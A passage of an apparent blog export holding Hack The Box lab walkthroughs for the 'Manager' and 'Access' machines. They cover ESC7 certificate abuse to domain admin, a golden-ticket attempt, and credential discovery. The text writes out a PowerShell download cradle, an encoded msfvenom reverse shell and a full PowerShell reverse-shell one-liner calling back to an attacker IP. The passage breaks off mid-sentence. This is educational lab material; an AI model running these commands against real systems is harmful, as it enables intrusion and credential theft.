        "title": "Manager HTB Walkthrough: Active Directory, Certificate Authority, and ESC7 Exploitation",
        "tags": ["Box","HTB","Manager","Windows","LDAP","kerberos","SMB","MSSQL","Certificate","CA","ESC7",],
        "content": "Hack The Box Manager Walkthrough/Writeup: https://app.hackthebox.com/machines/Manager How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scan:\nnmap $box -Pn -oA basicScan Host is up (0.040s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl This scan already gives us a lot to go off of.\nWe can see that numerous services are running: What is telling is that port 53 is running, which means this host is running it\u0026rsquo;s own DNS service, which would indicate that it\u0026rsquo;s running as a server or even a DC. We can also see that it\u0026rsquo;s running 88 kerberos \u0026amp; 389,3268,3269 ldap/ldapssl which again indicates it\u0026rsquo;s a server/DC. We also have 1433 MSSQL running. Lots of interesting things. In depth scan:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP We can see the host is called DC01 which lets us know this is a high-value target as it\u0026rsquo;s a domain controller. Web 80: Looking at the website, it appears to be running a content writing service:\nWappalyzer doesn\u0026rsquo;t give any additional information regarding the underlying software stack being used.\nI check the \u0026ldquo;contact\u0026rdquo; page for injection as it has a submission form:\nHowever it does not appear to be injectable: I perform some dirbusting with little to no results:\nTip, as soon as you start investigating any websites, ALWAYS proxy them through burp straight away. This way as you are working your way around the site looking for injection points and seeing how the site works and reacts to input you have a log already running. SMB 445: SMB appears to allow us to login via the guest account:\nThere are a number of shares running, but we only have read access to the IPC$ share:\nAs expected there is nothing in it:\nOver view of IPC$ Share: Quick overview if you are unfamiliar with the IPC$ share: The IPC$ share (Inter-Process Communication) is a special administrative share in Windows which allows communication with programs via Named Pipes: It\u0026rsquo;s mainly used for inter-process communication between hosts over a network. It also enables remote administration of a system, allowing file and print sharing. It\u0026rsquo;s a default share on windows systems. Requires credentials for access, typically used in conjunction with administrative or user rights. But as you can see Guest creds can also work in some instances. It is possible to use IPC$ for enumeration (e.g., enumerating users, shares, groups or services). LDAP 389: Using LDAP anonymous bind to enumerate further:\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.11.9 4GiB/7GiB | 780kiB/1GiB with /usr/bin/zsh 🕙 20:42:31 zsh ❯ python3 ldapchecker.py $box Attempting to connect to 10.129.188.216 with SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=manager,DC=htb CN=Configuration,DC=manager,DC=htb CN=Schema,CN=Configuration,DC=manager,DC=htb DC=DomainDnsZones,DC=manager,DC=htb DC=ForestDnsZones,DC=manager,DC=htb We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=manager,DC=htb ldapServiceName: manager.htb:dc01$@MANAGER.HTB The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: That any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=manager,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. DNS 53: I run DNSenum on the host to find out if there are any interesting entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt manager.htb Unfortunately I get very little from this bar the standard DNS entries present on DC\u0026rsquo;s by default: domaindnszones.manager.htb: Stores DNS records replicated across all domain controllers in the domain. forestdnszones.manager.htb: Stores DNS records replicated across all domain controllers in the forest. gc._msdcs.manager.htb: Used to locate Global Catalog servers for cross-domain queries and authentication. Kerberos 88: As kerberos is open we can also enumerate users, groups and some other information:\nI spin up Kerbrute and pass it a username list from seclists :\nkerbrute userenum -d manager.htb --dc $box ~/Wordlists/seclists/Usernames/xato-net-10-million-usernames.txt\nI use the impacket-lookupsid module to further enumerate groups, users \u0026amp; machine accounts:\nimpacket-lookupsid manager.htb/guest@dc01.manager.htb -domain-sids We find some interesting things here: Standard User accounts built into any DC. Machine account DC01$. All machine accounts are followed by the $ symbol Groups. Non default user accounts. You may also notice that the user ChinHae did not show up in kerbrute this is due to us using brute-forcing to enumerate users in kerbrute where-as with this module we are actively querying the DC for this information. Making a list….checking it once?: There does not seem to be anything obvious and low-hanging that is exploitable. So I am going to try some password spraying, using the users name as their password. If this does not work I will then crawl the site using CeWL to generate a custom password list. I create a password list from their usernames, to avoid complexity I have made all passwords lower-case. netexec smb $box -u Users.txt -p Passwords.txt --no-bruteforce As I currently do not know the password policy (I tried enumerating it but the guest account would not allow me to, nor would LDAP) I used the --no-bruteforce flag which means it will not try all combinations. I get a hit! 2. Foothold: Credentialed SMB Enumeration: I check if we have access to more smb shares with the creds \u0026amp; we do:\nOften the SYSVOL share will be used to hold scripts on a DC so this is a good target to go after.\nSMBClient:\nI check both shares and we cannot list the contents of them: smbclient -U '$user' \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; smbclient -U '$user' \u0026quot;\\\\\\\\$box\\\\NETLOGON\u0026quot; See future bloodstiller note below for why this did not work, it was my syntax!!! SMBMAP:\nTo ensure I am not getting false positives from my tools I also try SMBMAP: smbmap -u '$user' -p '$user' -H $box -r Future Bloodstiller here: This didn\u0026rsquo;t work as I had enclosed my alias\u0026rsquo; in quotations it should have been $user not $user and it would have listed the contents of the shares. However I still did not have access to read items within. Netexec Spidering:\nI try one more tool, netexec and use it to spider, netexec smb $box -u $user -p $user -M spider_plus -o EXCLUDE_DIR=IPC$ We can see from the results that there are files \u0026amp; shares available. I have excluded the IPC$ share from this process as although privesc is possible using this share it\u0026rsquo;s most probably unlikely due to the complexity of the attack \u0026amp; this is a medium rated box. Which means there are files here it just may be that our current user does not have access to them. Credentials MSSQL Enumeration: I check if our credentials are valid for the MSSQL service running \u0026amp; they appear to be:\nI connect using impacket-mssqlclient:\nsudo impacket-mssqlclient manager.htb/$user:$user@$box -windows-auth I go for the easy win of trying to enable xp_cmdshell so we can run commands on the underlying OS but alas we do not have required perms:\nI also try running xp_dirtree to see if I can read files on the underlying OS\nEXEC xp_dirtree 'C:\\', 1, 1;\nWe get a hit! This means we can read files \u0026amp; folders on the underlying OS \u0026amp; there are some interesting folders here already: inetpub (webserver) Recovery (potentially backups) SQL2019 (it\u0026rsquo;s in the name….) Users (….really?) What is xp_dirtree?\nxp_dirtree is a built-in SQL Server stored procedure that lets us list the contents of a directory—whether that\u0026rsquo;s subfolders, files, or both—without leaving the comfort of SQL. We tell it which folder to start with, how deep to go, and whether we want to see files in addition to folders. Breaking down the command:\nEXEC xp_dirtree \u0026#39;C:\\\u0026#39;, 1, 1; C:: This is the starting point—the directory we want to look into. In this case, we\u0026rsquo;re starting at the root of the C: drive. 1 (depth): This tells xp_dirtree to only look in the top-level folder, without diving into subdirectories. We can increase this number if we want to see deeper levels. E.G. 2 etc. 1 (file flag): This tells SQL Server to include both files and directories in the result. If you set this to 0, it will only list directories. Finding a website backup: I find a website backup in C:\\inetpub\\wwwroot\nAs this backup is in the actual webroot itself we should be able to retrieve it via wget\nI download it: Finding Hard-coded Credentials: I expand the zip file and immediatley see a file called .old-conf.xml:\nI find hardcoded creds for the user Raven in the file:\nI verify these work with netexec:\nnetexec smb $box -u $user -p $pass --shares Again we see that Raven has access to the same shares as the operator user. Getting access to the system as Raven: I access the host using evil-winrm as Raven:\nUser flag:\n3. Privilege Escalation: Privesc Enumeration: I run WinPEAS and don\u0026rsquo;t get anything too interesting.\nI upload SharpHound.exe via evil-winrm and run a collection:\nLooking at our owned users, we can see that Raven has the Enroll edge/connection to the certificate authority MANAGER-DC01-CA@MANAGER.HTB:\nEnroll Edge Abuse:\nIn bloodhound it does not show us a specific attack path we can take:\nHowever looking at the bloodhound knowledge base for enroll it tells us the following:\nThe Enroll permission grants enrollment rights on the certificate template.\nThe following additional requirements must be met for a principal to be able to enroll a certificate:\nThe certificate template is published on an enterprise CA The principal has Enroll permission on the enterprise CA The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template It also links us to the article Certified_Pre-Owned So from what I can tell this is abuse of the CA as a means to privesc.\nCA Abuse to Privesc: I use Certipy to enumerate for vulnerabilities\ncertipy-ad find -vulnerable -u $user@manager.htb -p $pass -dc-ip $box I did import it into bloodhound, but I\u0026rsquo;ll be honest, I wasn\u0026rsquo;t sure what extra it gave me \u0026amp; as I am running bloodhound in docker I did not add the extra queries. Looking at the output I can see that Raven has dangerous permissions:\nWe can see that the attack path we can take is ESC7\nESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests\nThis means that she has the ManageCA rights over the CA and but utilzing the ESC7 scenario we can elevate our privileges to Domain Admin. We just need to follow the steps as outlined on https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7 :\nESC7 Attack Process Overview (simplified):\nPermissions Setup/Make ourselves an officer on the CA:\nAs we have the ManageCA permission on the Windows domain Certificate Authority (CA). We can also grant ourselves the Manage Certificates permission (using the ManageCA permission). We can add ourselves as an officer with Manage Certificates permission. This permission gives us control to handle certificate requests and issue certificates, even failed ones (that last one is important!) Vulnerable Certificate Template:\nThe SubCA certificate template is vulnerable to exploitation. If it is disabled, we will use our new permissions as an officer to enable it on the CA Making the Certificate Request:\nWe request a certificate using the SubCA template for an admin account (e.g., administrator@manager.htb). Our request will be denied, but we save the private key and note down the request ID. Re-Issuing the Denied Request:\nSince we have Manage Certificates permission, we can issue the previously denied certificate request using the request ID. Retrieving the Certificate:\nFinally, we retrieve the issued certificate and private key for the highly privileged account e.g. domain admin/admin. Result:\nWe now have a valid certificate for a privileged account, allowing us to impersonate that user and escalate our access. Step 1 Add Raven as an Officer, to manage \u0026amp; issue certs: certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -add-officer raven -debug Step 2 Enable SubCA template: Enable SubCA Template:\ncertipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -enable-template SubCA -debug The reason we do this is because:\nThe SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.\nI see this says ESC1 however we are using this cert as only admins can enroll using this cert and we want to privesc to admin. Verify the template has been enabled:\ncertipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -list-templates -debug Step 3 Request a certificate on behalf of the administrator: We request a certificate for the administrator, as expected it is denied: certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb -debug We opt to save it anyway \u0026amp; take a note of the number listed 23 This is the most important part of this whole process. We are setting the UPN (User Principal Name) to be administrator@manager.htb this means we are requesting this ticket on behalf of the administrator user. Step 4 Re-issue our failed cert: We re-issue our failed cert: certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -issue-request 23 -debug Step 5 Retrieve the issued cert and download as .pfx: We request our re-issued cert and download it: certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -retrieve 23 -debug Step 6 Retrieve the Admin Hash: Sync your clock first:\nFor the love all that is HOLY do this before you progress any further!!\nSync your Kali/attack host clock with the box. The reason is if you do not, kerberos will be unhappy and not let you progress. This is a security mechanism. If you see the below error this is most likely down to your attack host clock being too out of sync with the target. If you are on kali do the following:\nsudo apt install ntpdate Ensure that you have the host in your /etc/hosts file \u0026amp; then run: sudo ntpdate -s manager.htb this will sync your clocks. Retrieve Admin Hash!:\ncertipy-ad auth -pfx administrator.pfx Attack Deep-Dive e.g. Exploiting UPNs in ESC7 Attacks: A Hacker\u0026rsquo;s Guide: What\u0026rsquo;s a UPN and Why Do We Care?\nFirst things first: UPN stands for User Principal Name (UPN). They\u0026rsquo;re commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here\u0026rsquo;s why they\u0026rsquo;re so important: They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension. They link certificates to specific Active Directory accounts. They enable certificate mapping for authentication. They facilitate Single Sign-On (SSO) scenarios. They\u0026rsquo;re used in smart card logons. Sometimes, they even correspond to email addresses. The ESC7 Attack: Our Ticket to Domain Admin: The ESC7 attack path all revolves around a misconfigured certificate template.\nWe find a template that lets us specify our own Subject Alternative Name (SAN) when requesting a certificate. SubCA\nWe request a certificate and we specify a UPN of a high-privileged account (like a domain admin) in the certificate\u0026rsquo;s SAN field.\nThe CA will issue us a certificate with our specified UPN, even though it doesn\u0026rsquo;t match our actual identity.\nNow we can authenticate as admin:\nFrom Certificate to Domain Domination:\nBut wait, you might ask, \u0026ldquo;Bloodstiller, how do we actually use this certificate to own the domain?\u0026rdquo; Great question! Here\u0026rsquo;s how we turn our shiny new cert into total control:\nWe present our manipulated certificate to the target system (usually a domain controller).\nThe system checks the cert: Is it valid? Not expired? Issued by a trusted CA?\nAs we have power to issue certs, it\u0026rsquo;s valid - check. We just issued it - check. As CA\u0026rsquo;s be default trust certs issues by themselves - check! Here\u0026rsquo;s where the magic happens: the DC/System extracts the UPN (which we set) from the SAN field of our certificate.\nIt uses this UPN to find the corresponding user account in Active Directory. Remember, this is the admin account we specified, not our actual account!\nIf everything looks good (and why wouldn\u0026rsquo;t it?), the system hands us a Kerberos Ticket Granting Ticket (TGT) for that account.\nBoom! We now have a TGT for a high-privileged account. We can use this ticket to access resources and wreak havoc with admin privileges.\n+Note+: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a .cacche file so we can then perform PTT attacks from the comfort of our attack box. Why This Attack is a Hacker\u0026rsquo;s Dream: It bypasses multi-factor authentication (MFA)!!! No account lockouts to worry about. It\u0026rsquo;s stealthy - often not logged as clearly as failed password attempts. All our actions look like they\u0026rsquo;re coming from the real admin account. 4. Ownership: I login as the admin using their hash: 5. Persistence: My original plan was to craft a golden ticket however for whatever reason it would not work, I tried numerous ways with mimikatz, ruebeus etc but it would always give me the error:\n[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked) it may just be that this host is set to detect Golden Ticket abuse. I did consider doing a diamond exploit, however I need to look more into the process. I have persistence via the hashes of the users below:\nI dump the NTDS db so I can retrieve the krbtgt account hash Process of failed Golden Ticket Attack: In-case anyone can see any glaring issues. If you can hit me up on bloodstiller at proton.me \u0026amp; tell me why I am dumb please. Upload nc.exe \u0026amp; mimikatz via existing administrator evil-winrm session Sync host clock with target clock (this is important!) Start reverse shell: If anyone is wondering why I am creating a reverse shell when I have an evil-winrm shell, it\u0026rsquo;s because mimikatz does not play nice with evil-winrm. Request golden ticket kerberos::golden /domain:manager.htb /user:administrator /sid:S-1-5-21-4078382237-1492182817-2568127209-500 /krbtgt:b5edce70e6c1efa075f14bcf5231f79a Download ticket.kirbi Convert ticket.kirbi to .cacche for use on linux. Import .ccache file into KRB5CCNAME variable Run klist to ensure ticket is imported variable. As we can see this ticket is valid for 10 years: I also tried appending the specific user SID for admin of 500 \u0026amp; also using a lower-case administrator. Run impacket-psexec: Lessons Learned: What did I learn? I learned alot about certificate attacks, I had done very little on them previously so this was nice to get done. I learned about golden ticket attacks being thwarted…… What silly mistakes did I make? Enclosing my user \u0026amp; password vars in quotations marks rendering them USELESS! We live and learn The standard not updating /etc/hosts when doing LDAP queries etc. Oh here is a fun one, I spent a good amount of time trying to exfil the website backup before realizing it was in-fact in the webroot and I could just wget it. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

    "http:\/\/localhost:1313\/walkthroughs\/access-box\/": {
        "title": "Access HTB Walkthrough: PST Files, LNK Exploitation, and Stored Credentials",
        "tags": ["Windows","HTB","Hack The Box","PST Files","LNK Files","Telnet","Active Directory","Stored Credentials","Windows Security","Privilege Escalation","FTP","Microsoft Access","Database Security",],
        "content": "Access Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Access How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Simple NMAP to get a view of low hanging fruit: kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 19:30:03 zsh ❯ nmap $box -Pn Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:30 BST Nmap scan report for 10.129.199.196 Host is up (0.056s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 23/tcp open telnet 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 15.06 seconds Advanced All Ports NMAP Scan: kali in 46-Boxes/46.02-HTB/Access/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 19:29:41 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP $box [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 19:30 BST Nmap scan report for 10.129.199.196 Host is up (0.040s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can\u0026#39;t get directory listing: PASV failed: 425 Cannot open data connection. | ftp-syst: |_ SYST: Windows_NT 23/tcp open telnet? 80/tcp open http Microsoft IIS httpd 7.5 |_http-title: MegaCorp |_http-server-header: Microsoft-IIS/7.5 | http-methods: |_ Potentially risky methods: TRACE Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%) OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 382.99 seconds We can see that so far it\u0026rsquo;s just the 3 services running, FTP, telnet \u0026amp; HTTP \u0026amp; that the system is mostly likely running windows 8 HTTP Enumeration: I run feroxbuster on the domain but the results are slim. The page also appears to be a simple holding page. Telnet Enumeration: Telnet Enumeration:\nNot really much here to be honest. kali in 46-Boxes/46.02-HTB/Access/scans/nmap 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 19:31:45 zsh ❯ nmap -n -sV -Pn --script \u0026#34;*telnet* and safe\u0026#34; -p 23 $box -oA telnetScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-10 09:54 BST Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.129.199.196 Host is up (0.036s latency). PORT STATE SERVICE VERSION 23/tcp open telnet? Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 176.99 seconds FTP Enumeration: I connect via FTP and can see there are shares available. Backups Share Enumeration: I can see in the Backups share there is a file called backup.mdb\nAn MDB file is a database file created by Microsoft Access, a widely-used desktop relational database program. It contains the database structure (tables and fields) and database entries (table rows). MDB files may also store data entry forms, queries, stored procedures, reports, and database security settings.\nMore Information\nSo this could be good as it could contain creds etc: It\u0026rsquo;s been replaced by the newer .accdb format. It could include basic password protection but the format lacks advanced encryption, making it less secure than newer formats. I try and download it using netexec, but it loses it\u0026rsquo;s damn-mind:\nI figured I\u0026rsquo;d try netexec\u0026rsquo;s ftp download method, but that\u0026rsquo;s what I get for trying something new I suppose. I then continue to have consistent issues with Passive mode:\nHowever there is a way around this and you can just download all of the data at once using wget: Command: wget -m –no-passive ftp://anonymous:anonymous@$box backup.mdb enumeration: I run strings on the file and can see some interesting things like potential usernames/fields:\nI tried to open the file with dbeaver but for some reason it would not display correctly.\nThere is luckily a probject called mdbtools we can use:\nhttps://github.com/mdbtools/mdbtools sudo apt install mdbtools Find out how many tables \u0026amp; their names:\nAs we can see there is an entry called auth_user I dump this entry \u0026amp; get 3 lots of creds:\nSo we have 3 sets of creds, lets take a look at the other services share:\nAlt options: I find the website: https://www.mdbopener.com/ which let you upload the file \u0026amp; have it extract all the tables to .csv files. +Note+: I WOULD NEVER DO THIS OR SUGGEST THIS ON AN ENGAGEMENT!!!! But this is an option for this challenge/box. (I chose not too as I want to make it as close to life as possible for me) Engineer Share Enumeration: There is a .zip file in here called Access Control.zip\nI try and unzip but I am denied as it has access control on it which means password protection\nI run file on it to ensure it\u0026rsquo;s actually a .zip \u0026amp; it is, encrypted with AES.\nI run zip2john on it to generate a hash.\nI run it through rockyou but get no hits.\nI extract it in my gui and use one of the passwords I extracted from the .mdb \u0026amp; it works!\nI am given a file called Access Control.pst Viewing Contents of the .pst file: What is a .pst: A PST file is a data storage file that contains personal information used by Microsoft Outlook and Exchange. It may also include e-mail folders, contacts, addresses, and other data.\nSo this could hold even more valuable information!\nI switch to my Windows VM and download this software so I can view the contents of the .pst:\nhttps://www.ostpstviewer.com/download.aspx Once imported, I find a single email which contains a password for the security user:\n2. Foothold: With the new credentials for security I login to the telnet server\nIt gives me access to the C:\\ drive of the host.\nSystem Info: I can see the system is actually running Microsoft Windows Server 2008 R2 Standard Shell Upgrade: Initially I try and run powershell but it crashes.\nTelnet is trash, well it\u0026rsquo;s not as we are accessing the host via it, but it\u0026rsquo;s not great to work in. It\u0026rsquo;s slow and doesn\u0026rsquo;t allow us to delete characters. Lets upgrade our shell.\nFuture bloodstiller here:\nWe can actually get a good powershell session from telnet by doing the following: powershell -File - This was not something I was aware of until I had finished the box \u0026amp; read 0xdf\u0026rsquo;s awesome write-up: https://0xdf.gitlab.io/2019/03/02/htb-access.html (i like to read other writeups after I have finished mine to see what I could have done differently and find a different perspective \u0026amp; approach) I start a python server on my attack machine to host my nc.exe binary:\nI execute powershell from CMD \u0026amp; get it to download the nc.exe binary:\npowershell -c \u0026quot;(New-Object Net.WebClient).DownloadFile('http://10.10.14.44:9000/shell.exe','C:\\Users\\Security\\shell.exe')\u0026quot; Start my nc listener on my attack host:\nnc -nvlp 9999 Trigger nc on the target to connect back:\nAnnnnnnnnnd we are blocked by group policy! Sneaky admins. Lets try a super encoded shell:\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=9999 -a x86 --platform windows -e x86/shikata_ga_nai -i 100 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 200 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -f exe -o newshell1.exe BLOCKED AGAIN! We can assume that anything not on a strict \u0026ldquo;allow\u0026rdquo; list is blocked by Group Policy. So let\u0026rsquo;s switch gears and just live off the land with good ol\u0026rsquo; powershell.\nSimple Powershell reverse shell:\nFinally we get a connection with the below, I have this saved into my notes as a goto but if you are unfamiliar you can also generate it with: https://www.revshells.com/ powershell -nop -c \u0026#34;$client = New-Object System.Net.Sockets.TCPClient(\u0026#39;10.10.14.44\u0026#39;,9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026#39;PS \u0026#39; + (pwd).Path + \u0026#39;\u0026gt; \u0026#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u0026#34; ZTeko Enumeration: I find a file folder called ZKTeco in the root folder.\nIt appears to contain a copy of a program called ZKAccess3.5\nA quick search turns up this public exploit:\nhttps://www.exploit-db.com/exploits/40323 Desc: ZKAccess suffers from an elevation of privileges vulnerability which can be used by a simple authenticated user that can change the executable file with a binary of choice. The vulnerability exist due to the improper permissions, with the \u0026lsquo;M\u0026rsquo; flag (Modify) for \u0026lsquo;Authenticated Users\u0026rsquo; group.\nI check the permissions to see if it\u0026rsquo;s vulnerable:\nIt\u0026rsquo;s not, we are missing the \u0026quot;M\u0026quot; flag for modify for any of the users groups.\nSo it appears this is not vulnerable to this specific exploit but I will put a pin in it, incase we can somehow leverage it later on. System Enumeration: We need to enumerate more to find a viable privesc path. So WinPeas etc is great but I have been trying to manually enumerate more as a way to get better at living off the land and working with the tools locally. Let\u0026rsquo;s do some standard enumeration and see what we have available. User Privs: Little in the way of user or group privs: Installed Programs: I check for installed programs. (\u0026#39;HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;, \u0026#39;HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\u0026#39;) | ForEach-Object { Get-ItemProperty -Path $_ } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation, InstallDate | Format-Table -AutoSize The only thing that jumps out at me is the ZKTeco software again. 3. Privesc: cmdkey /list discovery: I run cmdkey /list \u0026amp; get a hit: So we can see that the Administrator has a domain password stored on this machine! cmdkey /list displays a list of stored usernames and credentials on the system. It won\u0026rsquo;t let us actually view the creds however we can start enumerating for files that would use this feature. Now, we need to figure out what it\u0026rsquo;s actually stored for, as windows may store creds for multiple reasons. lnk file enumeration: One reason that the system may have stored credentials is so that a binary can be run with elevated privileges without the administrator having to enter their credentials every time it runs.\nA common way to do this is to use the runas /savecred switch within a shortcut/lnk file:\nE.G. create a new lnk/shorcut file on windows but make the content the following:\nrunas /user:\u0026lt;username\u0026gt; /savecred \u0026quot;Your Executable Here\u0026quot; this will generate a shortcut file. It will request the credentials for the specified user the first time it\u0026rsquo;s run \u0026amp; store those credentials, but after that it will run in the context of that user every time by using the stored credentials. The key thing for us as pentesters is this Once credentials are saved using runas /savecred, any application can be run in the context of that account without re-entering the credentials. When these lnk files are generated they retain the runas string within them and we can enumerate and search for these to find out if this is a viable privesc path: We can 